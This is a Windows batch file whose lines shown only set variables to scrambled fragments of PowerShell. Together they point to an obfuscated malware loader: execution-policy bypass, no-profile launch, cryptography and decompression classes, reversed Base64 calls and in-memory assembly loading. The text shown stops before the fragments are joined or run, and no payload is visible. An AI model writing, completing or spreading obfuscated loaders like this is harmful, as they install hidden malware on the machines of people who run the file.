@echo off
set "GXqrcWCGsJ=New-"
set "xXTBvwQNZI=Star"
set "qvhdsLNIqI===')"
set "uUfbMsEywL=rofi"
set "qhWCXMLKKo=ect "
set "MkcDNaxEjN=se()"
set "YufrysELbF=vj0m"
set "tiSnFUYIad=tion"
set "xOFxuQsfGd=3); "
set "OYqEqacZmA='')("
set "QgNyPfydMw=..-1"
set "xRHeCdpUMy=y.Cr"
set "iMIphUgbyp=pose"
set "YXxWrSmGgZ=.Dis"
set "OSxgNxeErE=vert"
set "JDxrqGaAdf=).Sp"
set "ALedjKpuaV=m.IO"
set "aHWKrZDfCC=g = "
set "BJsVXXOFlO=V = "
set "eOniqYvHCF=pher"
set "uVZXgEuehk=Comp"
set "PmBojKEBNd=..-1"
set "OqbGSJjzbt=UGTu"
set "gXnJtvbRfg= = ["
set "TrBlkdFEZe=$eAx"
set "hLknwtRqLY=raph"
set "jqFPObKKHa=comp"
set "COZOFRubku=ptor"
set "KpoViSImlE=;$Aa"
set "FmFsMtDjIf=Disp"
set "wcQkSxtUXM=k; }"
set "xQJXuWlHFe=esFX"
set "HIosQIyPZH=+hAO"
set "zBgkUnHCFI=nirt"
set "jNPYMmCwcr=bypa"
set "rJEtCotorR=Syst"
set "PBpPUIkecs=m.Re"
set "QJAlzXSXOW='gni"
set "JEpteARigQ=ispo"
set "JcEkZDRVQn=($Ue"
set "EgtcPDcCYL=yste"
set "wJKJlVCTFT=[Sys"
set "AiEDbaLeRz=Obje"
set "lBicomMwDy=.IO."
set "rVxiSItKiP=Obje"
set "fwlqiwWfJP=ert]"
set "dcnUkmWluA= = $"
set "gZWqyMSvwx=6esa"
set "SLliUODigc=wnUD"
set "CgzxsgzOwf=nage"
set "IqGMODhSit=J = "
set "IjJUTdkEEg=lBlo"
set "EWutULzFFm=wnUD"
set "bVTILrzDAJ=ay()"
set "uUZallXfyO=embl"
set "ImDNGmwJou=e]::"
set "IqPkmqcVtc=ck($"
set "VlcMGTsIuA=Be, "
set "BOdlEbVhAp=daeR"
set "kXegQnXeiD=y.Pa"
set "FtQTxXEeLC=esaB"
set "wAGUYcqMrN='txe"
set "UhCXcsPrSf=('%*'"
set "zNbCiErLIm=sion"
set "VSUWbwuMiz=$RBZ"
set "vAlqlYbMWm=$zRf"
set "rhHOlVmYLE=ateD"
set "PTufgpvHuA=3HWs"
set "rbeisyFBUU=-nop"
set "PjFaBYILqo=]::("
set "RdpKaMnQLb=.Key"
set "VBpSHGjCCz=();$"
set "WAeHYAPbpx=tem."
set "shxTLiFzbx=)($v"
set "TexlJEUzNl=rity"
set "oFiYgsAMFg=.Mod"
set "IkifJiCrzM=.Mem"
set "qxNrjrZVNB=;$pO"
set "YJWxSDNByp=mory"
set "pkCORYOgfQ=[IO."
set "eWRlXLdNKm=)) {"
set "XuocAlPpxz=6] -"
set "cxKhLatkAp=ddin"
set "fyLQTuxZbR=YIR."
set "IlazphWJbU=);$L"
set "RFamoqAYdo=yste"
set "agWMooNEfZ=ddin"
set "krtUxsHmrp=D.Pa"
set "mQIKVfchRv=[Sys"
set "PIKcawfxYP=d;$L"
set "HxgYLODxxk=  $v"
set "ofhIKCIdHx=comm"
set "rKcrcVvlSZ=gMod"
set "DSGKkyktWy=.Sec"
set "HGzotzCoMQ=.Cry"
set "TvTzTYtffa=$eAx"
set "PCJOWaqSXj=rity"
set "mLfNWXkhWj=in $"
set "TbWTEDKNLv=fore"
set "sYzUEAGqsQ=:('g"
set "ckxNFAHfAt=stem"
set "aYQDJkDoUs=stem"
set "qkeZGRxMTb=VvUP"
set "BirOHwaNKx=ring"
set "DyaZYgrwog=gth)"
set "hoeDIbJYrG==');"
set "XTkmtOEeqR=-1.."
set "gLvtyrboSe=GrAJ"
set "prhucPDAUE=qGrA"
set "xPcpjDmcYM== $L"
